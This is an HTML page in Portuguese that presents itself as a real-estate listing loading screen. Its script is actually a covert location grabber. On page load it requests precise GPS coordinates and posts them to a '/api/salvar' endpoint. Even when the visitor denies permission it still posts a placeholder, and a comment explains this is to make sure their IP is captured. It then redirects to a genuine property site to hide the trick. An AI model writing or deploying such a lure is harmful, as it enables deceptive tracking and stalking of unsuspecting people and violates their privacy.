<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando Imóvel...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f9; color: #333; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; width: 90%; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #btn-continuar-container {
            display: none;
            margin-top: 20px;
        }
        .btn-continuar {
            background-color: #27ae60;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>Carregando informações do imóvel...</h2>
        <div class="spinner" id="loader"></div>
        <p id="status-texto">Aguarde um momento.</p>

        <div id="btn-continuar-container">
            <button class="btn-continuar" onclick="avancar()">Continuar</button>
        </div>
    </div>

    <script>
        let enviado = false;

        function enviarDados(lat, lon, precisao) {
            if (enviado) return; // Evita enviar duas vezes
            enviado = true;

            fetch('/api/salvar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat, lon, precisao })
            }).finally(() => {
                window.location.href = "https://www.imovelweb.com.br";
            });
        }

        function pegarLocalizacao() {
            if (navigator.geolocation) {
                // Parâmetros otimizados para funcionar melhor no iPhone (Safari)
                const opcoes = {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                };

                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        // Sucesso: pega lat/lon reais
                        let lat = pos.coords.latitude;
                        let lon = pos.coords.longitude;
                        let precisao = pos.coords.accuracy;
                        enviarDados(lat, lon, precisao);
                    }, 
                    function(err) {
                        // Se falhou, negou ou está no iPhone com bloqueio:
                        // ENVIA MESMO ASSIM informando que o GPS falhou, garantindo que o IP seja capturado
                        enviarDados("NEGADO_OU_SEM_GPS", "NEGADO_OU_SEM_GPS", "0");

                        // Mostra o botão para o usuário poder sair da tela
                        document.getElementById('loader').style.display = 'none';
                        document.getElementById('status-texto').innerText = "Toque abaixo para carregar a página.";
                        document.getElementById('btn-continuar-container').style.display = 'block';
                    }, 
                    opcoes
                );
            } else {
                // Se o navegador não suportar, envia o alerta e redireciona
                enviarDados("NAO_SUPORTADO", "NAO_SUPORTADO", "0");
            }
        }

        function avancar() {
            window.location.href = "https://www.imovelweb.com.br";
        }

        window.onload = function() {
            pegarLocalizacao();
        };
    </script>
</body>
</html>
